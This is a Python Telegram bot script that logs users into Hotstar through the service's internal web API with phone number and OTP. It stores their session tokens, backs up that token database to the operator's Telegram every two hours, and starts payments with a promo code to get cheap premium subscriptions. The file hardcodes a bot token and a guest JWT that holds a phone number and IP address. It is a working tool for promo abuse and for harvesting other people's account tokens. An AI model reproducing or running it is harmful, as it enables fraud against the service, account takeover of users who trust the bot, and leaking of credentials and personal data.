import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import uuid
import qrcode
import io
import time
import threading
import json
import os

# ==========================================
# ⚙️ CONFIGURATION
# ==========================================
BOT_TOKEN = '8768111355:AAEwIyM2zz5qmWEnMtsC3t6tMos8G7PN9kM' # Apna Token
BOT_USERNAME = 'hotstar1rsbot' # ⚠️ YAHAN APNE BOT KA USERNAME DAALNA BINA '@' KE
ADMIN_ID = 6860106371 # Apna Telegram User ID

# Teeno Mandatory hain, inme bot ko admin banana zaroori hai!
MANDATORY_CHATS = ["@leakmethodfree", "@sabkijayhokhush", "@rosekhudkabanaya"]

# Railway optimization - Threaded polling
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=100)

app_config = {
    'GUEST_TOKEN': 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ7XCJoSWRcIjpcImM3ZGM4MGVhNzViNDQzNmVhZTg1MzVkMWM3OTFkMDFmXCIsXCJwSWRcIjpcImM0MGNjYjg0MWVkNjRkOGFhYjFlNGI1Y2ZmOTFhYzc5XCIsXCJkd0hpZFwiOlwiZmVhMjhjNDUwMGZmNWE4NDg3MTJiNDk2ZmY5ZjcxZGYwMzc3NGYwMGZlMDVjZDU1NmRiOWM1ZDAxZWZhOTI3ZVwiLFwiZHdQaWRcIjpcIjQyOWI2OTU5MWRkOGY1ZDJlNmQyY2M4Nzk5ZTkyMTcyYWYxNmRiZThhMDc3MDg3OTRhZWI1MjI1ZTQ5NzkzMTJcIixcIm9sZEhpZFwiOlwiYzdkYzgwZWE3NWI0NDM2ZWFlODUzNWQxYzc5MWQwMWZcIixcIm9sZFBpZFwiOlwiYzQwY2NiODQxZWQ2NGQ4YWFiMWU0YjVjZmY5MWFjNzlcIixcImlzUGlpVXNlck1pZ3JhdGVkXCI6ZmFsc2UsXCJuYW1lXCI6XCJZb3VcIixcInBob25lXCI6XCI5MTMwMDg5NTU4XCIsXCJpcFwiOlwiMTUyLjU4LjMzLjI0MFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjQ4NWQzOC01MDNjOTUtNjc0ODQxLTNhODc2YlwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNob0tFZ29PRWdVMU5UZ3pOaElGTmpRd05Ea0tBQklFT0dSWUFRb0xFZ2tJQ2pnQlVOQUZXQUVLeWdFS0JRb0RDZ0VBRXNBQkVnZGhibVJ5YjJsa0VnTnBiM01TQ1dGdVpISnZhV1IwZGhJR1ptbHlaWFIyRWdkaGNIQnNaWFIyRWdSeWIydDFFZ04zWldJU0JHMTNaV0lTQjNScGVtVnVkSFlTQlhkbFltOXpFZ1pxYVc5emRHSVNDbU5vY205dFpXTmhjM1FTQkhSMmIzTVNCSEJqZEhZU0EycHBieElIYW1sdkxXeDVaaElFZUdKdmVCSUxjR3hoZVhOMFlYUnBiMjRTREdwcGIzQm9iMjVsYkdsMFpSSU5abVZoZEhWeVpXMXZZbWxzWlJvQ2MyUWFBbWhrSWdOelpISXFCbk4wWlhKbGIxZ0JFaWNJQVNBQk1BRTZId29iU0c5MGMzUmhjbEJ5WlcxcGRXMHVTVTR1VFc5dWRHZ3VNams1RUFFPVwiLFwiaXNzdWVkZXRcIjoxNzg5NzIwMzc2Nzk1LFwiZHBpZFwiOlwiYzQwY2NiODQxZWQ2NGQ4YWFiMWU0YjVjZmY5MWFjNzlcIixcInN0XCI6MSxcImRhdGFcIjpcIkNnd0lBQ0lJa0FIQTY1YWRpelFLQkFnQU9nQUtMZ2dBUWlvS0tFSTBOMkk1WW1WaVkyRmlNR1kwTWprd09HVTJNalpqTkRFMk1HVTFZelkxTWxKNFJHdEJjSFE9XCJ9IiwiaXNzIjoiVU0iLn0.ZbH4vvjiUuqCuBX4-vmFhHcC90_blikY1l29zBmcCxs', 
    'DEVICE_ID': '485d38-503c95-674841-3a876b'
}

# ==========================================
# 💾 DATABASE HANDLING (RAM Optimization)
# ==========================================
DB_FILE = "database.json"
user_sessions = {} # OTP ke liye temp RAM memory (Auto clear hogi)

def load_data():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {"users": {}, "accounts": {}, "stats": {"total_qr": 0}}

def save_data(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f)

db = load_data()

def get_real_headers(token, device_id):
    return {
        'Host': 'web.hotstar.com',
        'Connection': 'keep-alive',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'X-Hs-Client': 'platform:web;app_version:26.09.05.0;browser:Chrome;schema_version:0.0.1797;os:Windows;os_version:10;browser_version:146;network_data:4g',
        'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
        'Sec-Ch-Ua-Mobile': '?0',
        'X-Hs-Platform': 'web',
        'X-Country-Code': 'in',
        'X-Hs-Device-Id': device_id,
        'Content-Type': 'application/json',
        'X-Hs-App': '260905000',
        'X-Hs-Usertoken': token,
        'Origin': 'https://web.hotstar.com',
        'Referer': 'https://web.hotstar.com/in/onboarding/login',
    }

# ==========================================
# 🔄 FORCE SUB CHECKER
# ==========================================
def is_joined(user_id):
    if str(user_id) == str(ADMIN_ID): return True
    for chat in MANDATORY_CHATS:
        try:
            member = bot.get_chat_member(chat, user_id)
            if member.status in ['left', 'kicked']:
                return False
        except Exception as e:
            print(f"Make sure bot is admin in {chat}. Error: {e}")
            return False
    return True

def force_sub_markup():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("📢 Join Channel 1", url="https://t.me/leakmethodfree"))
    markup.row(InlineKeyboardButton("📢 Join Channel 2", url="https://t.me/sabkijayhokhush"))
    markup.row(InlineKeyboardButton("💬 Join Group 1", url="https://t.me/rosekhudkabanaya"))
    markup.row(InlineKeyboardButton("💡 Join Group 2 (Optional)", url="https://t.me/findyourskills"))
    markup.row(InlineKeyboardButton("✅ I Have Joined (Verify)", callback_data="verify_join"))
    return markup

# ==========================================
# 🚨 HELPER: ADMIN ALERT & AUTO BACKUP
# ==========================================
def send_admin_alert(user, action, extra=""):
    try:
        username = f"@{user.username}" if user.username else user.first_name
        alert_text = f"🚨 <b>ACTIVITY</b>: {action}\n👤 User: {username} (<code>{user.id}</code>)\n{extra}"
        bot.send_message(ADMIN_ID, alert_text, parse_mode="HTML")
    except: pass

def auto_backup_thread():
    while True:
        time.sleep(7200) # Har 2 ghante me (7200 sec)
        try:
            total_users = len(db["users"])
            total_accs = sum(len(accs) for accs in db["accounts"].values())
            total_qrs = db["stats"]["total_qr"]
            
            backup_msg = (
                "📦 **AUTO BACKUP (2 HOURS)** 📦\n\n"
                f"👥 Total Users: `{total_users}`\n"
                f"📱 Saved Accounts: `{total_accs}`\n"
                f"🎉 Total QRs Generated: `{total_qrs}`\n\n"
                "✅ Database is safe and optimized!"
            )
            bot.send_message(ADMIN_ID, backup_msg, parse_mode="Markdown")
            
            # Send file backup
            with open(DB_FILE, 'r') as f:
                bot.send_document(ADMIN_ID, f, caption="Backup Database File")
        except Exception as e:
            print("Backup failed:", e)

# ==========================================
# 🛠 HELPER: QR CODE GENERATOR
# ==========================================
def generate_and_send_qr(chat_id, number, logged_in_token, user_info):
    msg = bot.send_message(chat_id, f"⏳ Generating QR Code for **{number}**...", parse_mode="Markdown")
    session = requests.Session()
    
    init_url = "https://web.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate/lite"
    init_headers = get_real_headers(logged_in_token, app_config['DEVICE_ID'])
    init_headers['X-Hs-Request-Id'] = str(uuid.uuid4())
    
    init_payload = {"paymentMode": "UPI", "pgName": "phonepe", "paymentProcessor": "phonepeQR", "paymentType": "RECURRING", "subscriptionPack": "HotstarSuper.IN.1Month.149", "returnUrl": "https://web.hotstar.com/in/payment/status", "promoCode": "CLOUDSPO100", "abTags": ["PayX", "V1_FLOW", "PayXWeb", "NONPAYTMQR", "V1_FLOW"], "pgParams": {"versionCode": "-1", "redirectURL": "https://web.hotstar.com/in/payment/status", "mobileNumber": number}, "userSegments": ["CONTROL", "DEFAULT"]}
    
    try:
        qr_res = session.post(init_url, headers=init_headers, json=init_payload, timeout=15)
        
        if qr_res.status_code in [200, 201]:
            res_data = qr_res.json()
            order_id = res_data.get('pollPayload', {}).get('orderId')
            if not order_id: order_id = res_data.get('description', {}).get('pollPayload', {}).get('orderId')
            
            if order_id:
                status_url = f"https://web.hotstar.com/api/internal/bff/gringotts/v2/web/initiate/{order_id}/status"
                qr_string = None
                for i in range(6):
                    status_res = session.get(status_url, headers=init_headers, timeout=10)
                    if status_res.status_code in [200, 201]:
                        qr_string = status_res.json().get('description', {}).get('postData', {}).get('qrString')
                        if qr_string: break
                    elif status_res.status_code == 202: time.sleep(1.5)
                    else: break
                        
                if qr_string:
                    qr = qrcode.QRCode(version=1, box_size=10, border=5)
                    qr.add_data(qr_string)
                    qr.make(fit=True)
                    img = qr.make_image(fill_color="black", back_color="white")
                    
                    bio = io.BytesIO()
                    bio.name = 'qr_code.png'
                    img.save(bio, 'PNG')
                    bio.seek(0)
                    
                    caption_text = (
                        f"🎉 **QR Code Ready for {number}!**\n\n"
                        "Is QR Code ka screenshot lein aur kisi bhi UPI App mein 'Scan from Gallery' karke ₹1 pay karein.\n\n"
                        "⚠️ **ZAROORI SOOCHNA:**\n"
                        "Payment karte time aapke account se ₹1 debit hoga aur **AutoPay** enable ho jayega. Turant apne UPI App ke 'AutoPay' section mein jake usko **Cancel** kar dein taaki future mein paisa na kate.\n\n"
                        "**UPI String:**\n`{qr_string}`"
                    )
                    
                    bot.delete_message(chat_id, msg.message_id)
                    bot.send_photo(chat_id, photo=bio, caption=caption_text, parse_mode="Markdown")
                    
                    # Deduct 1 QR logic & Stats update
                    user_id_str = str(user_info.id)
                    db["users"][user_id_str]["qrs_used"] += 1
                    db["stats"]["total_qr"] += 1
                    save_data(db)
                    
                    send_admin_alert(user_info, "✅ Generated 1 QR Code", f"Number: <code>{number}</code>")
                else: bot.edit_message_text("❌ QR Request timed out. Try again later.", chat_id, msg.message_id)
            else: bot.edit_message_text("❌ Order ID not found.", chat_id, msg.message_id)
        elif qr_res.status_code == 403: bot.edit_message_text("❌ Is number par pehle se hi plan active hai. Naya number try karein.", chat_id, msg.message_id)
        else: bot.edit_message_text(f"❌ Payment Initiate Failed. Code: {qr_res.status_code}", chat_id, msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Error generating QR.", chat_id, msg.message_id)

# ==========================================
# 🎮 BOT COMMANDS & UI
# ==========================================
def get_main_menu():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("➕ Add New Account", callback_data="add_account"))
    markup.row(InlineKeyboardButton("📁 My Saved Accounts", callback_data="my_accounts"))
    markup.row(InlineKeyboardButton("🎁 My Referral & Balance", callback_data="my_referral"))
    markup.row(InlineKeyboardButton("🏆 Global Leaderboard", callback_data="leaderboard"))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    text = message.text.split()
    
    # Referral system logic
    if user_id not in db["users"]:
        referrer = text[1] if len(text) > 1 and text[1].isdigit() else None
        db["users"][user_id] = {
            "name": message.from_user.first_name,
            "referrals": 0,
            "qrs_used": 0,
            "referred_by": referrer
        }
        if referrer and referrer in db["users"] and referrer != user_id:
            db["users"][referrer]["referrals"] += 1
            bot.send_message(referrer, f"🎉 **New Referral!**\n{message.from_user.first_name} ne aapke link se join kiya.", parse_mode="Markdown")
        save_data(db)

    if not is_joined(message.from_user.id):
        bot.send_message(message.chat.id, "🛑 **Aage badhne ke liye humare channels join karein!**\nFirst 3 channels compulsory hain. Join karke Verify dabayein.", parse_mode="Markdown", reply_markup=force_sub_markup())
        return

    bot.send_message(message.chat.id, "📺 **Welcome to Hotstar Premium Bot!**\nYahan aap apne accounts login karke save kar sakte hain aur unke liye ₹1 plan activate kar sakte hain.", parse_mode="Markdown", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    user_id = str(call.from_user.id)
    data = call.data

    # Always check force sub for button actions
    if data != "verify_join" and not is_joined(call.from_user.id):
        bot.answer_callback_query(call.id, "Please join all channels first!", show_alert=True)
        bot.send_message(chat_id, "🛑 **Channels join karein:**", parse_mode="Markdown", reply_markup=force_sub_markup())
        return

    try:
        if data == "verify_join":
            if is_joined(call.from_user.id):
                bot.edit_message_text("✅ Channels Verified! Welcome to the Bot.", chat_id, call.message.message_id)
                bot.send_message(chat_id, "📺 **Main Menu**", reply_markup=get_main_menu())
            else:
                bot.answer_callback_query(call.id, "❌ Aapne abhi tak saare mandatory channels join nahi kiye hain!", show_alert=True)

        elif data == "main_menu":
            bot.edit_message_text("📺 **Main Menu**\nSelect an option below:", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=get_main_menu())

        elif data == "my_referral":
            user_data = db["users"].get(user_id, {"referrals": 0, "qrs_used": 0})
            total_refs = user_data["referrals"]
            used_qrs = user_data["qrs_used"]
            available_qrs = (total_refs // 5) - used_qrs
            
            ref_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
            text = (
                f"🎁 **YOUR REFERRAL DASHBOARD** 🎁\n\n"
                f"👥 **Total Referrals:** {total_refs}\n"
                f"🎟 **Available Free QRs:** {max(0, available_qrs)}\n"
                f"🎫 **Total QRs Claimed:** {used_qrs}\n\n"
                f"⚠️ **RULE:** 5 Referrals = 1 FREE Hotstar Premium QR!\n\n"
                f"🔗 **Your Link:**\n`{ref_link}`"
            )
            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
            bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

        elif data == "add_account":
            user_sessions[chat_id] = {'step': 'ask_number', 'session': requests.Session()}
            bot.edit_message_text("📱 Apna 10-digit Hotstar registered mobile number type karein:", chat_id, call.message.message_id)

        elif data == "my_accounts":
            accounts = db["accounts"].get(user_id, {})
            if not accounts:
                markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
                bot.edit_message_text("❌ Aapne abhi tak koi account save nahi kiya hai. Pehle 'Add Account' karein.", chat_id, call.message.message_id, reply_markup=markup)
                return
            
            markup = InlineKeyboardMarkup()
            for num in accounts.keys():
                markup.row(InlineKeyboardButton(f"👤 {num}", callback_data=f"select_{num}"))
            markup.row(InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
            bot.edit_message_text("📁 **Apne saved accounts me se ek select karein:**", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

        elif data.startswith("select_"):
            number = data.split("_")[1]
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("💸 Generate Premium QR", callback_data=f"pay_{number}"))
            markup.row(InlineKeyboardButton("❌ Remove Account", callback_data=f"remove_{number}"))
            markup.row(InlineKeyboardButton("🔙 Back to Accounts", callback_data="my_accounts"))
            bot.edit_message_text(f"⚙️ **Manage Account: {number}**\nAap kya karna chahte hain?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

        elif data.startswith("pay_"):
            # CHECK REFERRAL LOGIC HERE
            user_data = db["users"].get(user_id, {"referrals": 0, "qrs_used": 0})
            total_refs = user_data["referrals"]
            used_qrs = user_data["qrs_used"]
            available_qrs = (total_refs // 5) - used_qrs
            
            # Admin gets unlimited access
            if str(user_id) != str(ADMIN_ID) and available_qrs <= 0:
                bot.answer_callback_query(call.id, "❌ Aapke paas Free QRs nahi hain! 5 dosto ko refer karein.", show_alert=True)
                return
                
            number = data.split("_")[1]
            token = db["accounts"].get(user_id, {}).get(number)
            
            if token:
                bot.answer_callback_query(call.id, "Generating QR Code...")
                bot.delete_message(chat_id, call.message.message_id)
                generate_and_send_qr(chat_id, number, token, call.from_user)
                bot.send_message(chat_id, "Kuch aur karna hai? Menu open karne ke liye /start dabayein.")
            else:
                bot.answer_callback_query(call.id, "Session expired. Please login again.", show_alert=True)

        elif data.startswith("remove_"):
            number = data.split("_")[1]
            if user_id in db["accounts"] and number in db["accounts"][user_id]:
                del db["accounts"][user_id][number]
                save_data(db)
                bot.answer_callback_query(call.id, f"{number} removed successfully!", show_alert=True)
                handle_query(telebot.types.CallbackQuery(id=call.id, from_user=call.from_user, data="my_accounts", chat_instance=call.chat_instance, message=call.message))

        elif data == "leaderboard":
            sorted_users = sorted(db["users"].values(), key=lambda x: x["qrs_used"], reverse=True)
            text = "🏆 **GLOBAL LEADERBOARD (Top 10 QR Claimers)** 🏆\n\n"
            count = 0
            medals = ["🥇", "🥈", "🥉"]
            for user in sorted_users:
                if user["qrs_used"] > 0:
                    medal = medals[count] if count < 3 else "🏅"
                    text += f"{medal} **{user['name']}** - `{user['qrs_used']} Claims`\n"
                    count += 1
                if count >= 10: break
            if count == 0: text += "Abhi tak kisi ne claim nahi kiya!"
                
            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu"))
            bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    except Exception as e:
        print(f"Callback error: {e}")

# ==========================================
# 📩 LOGIN FLOW
# ==========================================
@bot.message_handler(func=lambda msg: user_sessions.get(msg.chat.id, {}).get('step') == 'ask_number')
def process_number(message):
    chat_id = message.chat.id
    number = message.text.strip()
    
    if len(number) != 10 or not number.isdigit():
        bot.send_message(chat_id, "❌ Invalid number! Enter 10 digits:")
        return

    user_sessions[chat_id]['number'] = number
    user_sessions[chat_id]['step'] = 'ask_otp'
    bot.send_message(chat_id, f"⏳ Bhej raha hu OTP {number} par...")
    
    url = "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp&packId=HotstarSuper.IN.1Month.149&page_enum=onboarding_login&promo=CLOUDSPO100,CLOUDSPO100&qrCode=true"
    payload = {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "initiate_by": 0, "recaptcha_token": "", "phone_number": number}}
    headers = get_real_headers(app_config['GUEST_TOKEN'], app_config['DEVICE_ID'])
    headers['X-Hs-Request-Id'] = str(uuid.uuid4())
    session = user_sessions[chat_id]['session']
    
    try:
        response = session.post(url, headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            bot.send_message(chat_id, "✅ OTP Sent! Type the 4-digit OTP here:")
        elif response.status_code == 401:
            bot.send_message(chat_id, "❌ Guest Token expired. Admin ko update karne bolo.")
            user_sessions.pop(chat_id, None)
        else:
            bot.send_message(chat_id, f"❌ Failed to send OTP. Code: {response.status_code}")
            user_sessions.pop(chat_id, None)
    except:
        bot.send_message(chat_id, f"❌ System Error")
        user_sessions.pop(chat_id, None)

@bot.message_handler(func=lambda msg: user_sessions.get(msg.chat.id, {}).get('step') == 'ask_otp')
def process_otp(message):
    chat_id = message.chat.id
    user_id = str(message.from_user.id)
    otp = message.text.strip()
    number = user_sessions[chat_id]['number']
    session = user_sessions[chat_id]['session']
    
    bot.send_message(chat_id, "⏳ Verifying OTP...")
    
    verify_url = "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/9?action=verifyOtp&page_enum=onboarding_login&promo=CLOUDSPO100,CLOUDSPO100&qrCode=true"
    verify_payload = {"body": {"@type": "type.googleapis.com/feature.login.VerifyPhoneLoginRequest", "verification_code": otp, "login_device_meta": {"device_name": "Chrome Browser on Windows"}, "phone_number": number}}
    headers = get_real_headers(app_config['GUEST_TOKEN'], app_config['DEVICE_ID'])
    headers['X-Hs-Request-Id'] = str(uuid.uuid4())
    
    try:
        verify_res = session.post(verify_url, headers=headers, json=verify_payload, timeout=15)
        if verify_res.status_code == 200:
            logged_in_token = verify_res.headers.get('X-Hs-Updatedusertoken')
            if not logged_in_token:
                bot.send_message(chat_id, "❌ Failed to get Auth Token.")
                user_sessions.pop(chat_id, None)
                return

            if user_id not in db["accounts"]: db["accounts"][user_id] = {}
            db["accounts"][user_id][number] = logged_in_token
            save_data(db)
            user_sessions.pop(chat_id, None) # RAM Free karega
            
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("💸 Generate QR Now", callback_data=f"pay_{number}"))
            markup.row(InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            
            bot.send_message(chat_id, f"✅ **Account Saved Successfully!**\nNumber: {number}\n\nAap iska QR code generate kar sakte hain (agar referrals pure hain).", parse_mode="Markdown", reply_markup=markup)
            send_admin_alert(message.from_user, "📥 Logged In & Saved", f"Number: <code>{number}</code>")
        else:
            bot.send_message(chat_id, "❌ Invalid OTP! Try again:")
    except:
        bot.send_message(chat_id, f"❌ Error occurred.")
        user_sessions.pop(chat_id, None)

@bot.message_handler(commands=['settoken'])
def update_token(message):
    if message.chat.id == ADMIN_ID:
        try:
            new_token = message.text.split(" ", 1)[1].strip()
            app_config['GUEST_TOKEN'] = new_token
            bot.reply_to(message, "✅ Guest Token successfully updated!")
        except:
            bot.reply_to(message, "⚠️ Format: `/settoken <YOUR_NEW_TOKEN>`", parse_mode="Markdown")

if __name__ == "__main__":
    print("🚀 Masterpiece Bot Started...")
    
    # Start auto backup thread in background
    backup_thread = threading.Thread(target=auto_backup_thread, daemon=True)
    backup_thread.start()
    
    bot.infinity_polling(timeout=20, long_polling_timeout=15)
